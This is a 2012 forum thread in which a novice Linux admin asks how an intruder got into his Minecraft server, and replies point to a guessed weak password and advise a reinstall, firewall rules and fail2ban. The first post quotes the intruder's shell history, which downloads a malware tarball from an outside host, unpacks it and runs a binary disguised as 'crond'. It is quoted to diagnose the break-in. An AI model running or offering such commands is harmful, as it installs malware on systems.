---
title: "Attempting to learn about this intrusion"
date: 2012-08-19
forum: Security
---

### Post by Rockman4140 on 2012-08-19
Hello there, I am a rather n00bish linux administrator attempting to provide a service to my friends; a Minecraft server.

I noticed a few months ago while popping in over VNC to check on it that someone had run some commands on my box. I wanted to see where I could go to learn more about them, what happened, how they gained entry and what they planned to do. 

```
history
wget www.deathface.comlu.com/emek/mechlinux.tgz
tar zxfv mechlinus.tgz
cd ...
nano mech.set
nano emech.users
nano emech.users1
nano emech.users2
./crond
```

All of my Google research has pulled up that this mechlinux is indeed associated with malware. I've given up on actually planning on salvaging the system; I plan a full on nuke of it to start again fresh. Some of my foolish mistakes were that I did not use SSL to administer the network, didn't set up a firewall, and used unsecure passwords. I will not make that mistake again, but if anyone else could help me to see exactly what happened with my system, I would be quite grateful.

---

### Post by bodhi.zazen on 2012-08-19
You used weak passwords, and an intruder guessed the password.

You can look at the files in the tar ball and the files to see what they do. You could pastebin the contents of the files somewhere if you wish.

You are almost certainly best off performing a fresh install and using strong passwords. ssl + firewall will help. You can configure the firewall to block repeat login attempts or use a service such as fail2ban.

See:

[http://bodhizazen.net/Tutorials/iptables/](http://bodhizazen.net/Tutorials/iptables/)

The additional tips section has advice for configuration under "Use iptables to block failed connections"

---

### Post by wacky_sung on 2012-08-20
> **bodhi.zazen said:**
> You used weak passwords, and an intruder guessed the password.

You can look at the files in the tar ball and the files to see what they do. You could pastebin the contents of the files somewhere if you wish.

You are almost certainly best off performing a fresh install and using strong passwords. ssl + firewall will help. You can configure the firewall to block repeat login attempts or use a service such as fail2ban.

See:

[http://bodhizazen.net/Tutorials/iptables/](http://bodhizazen.net/Tutorials/iptables/)

The additional tips section has advice for configuration under "Use iptables to block failed connections"

I bet what you offer him are just the fundamental but there are more things to do beside that. Setting a server is a open gate to any form of attacks such as using program exploits, DDOS, brute force dictionary attack, SQL, etc. There are no 100% bulletproof server but what you can do are to isolate the attacks and minimum the damage such as reformat,etc. A backup will always come handy.:lolflag::lolflag::lolflag::lolflag:

---

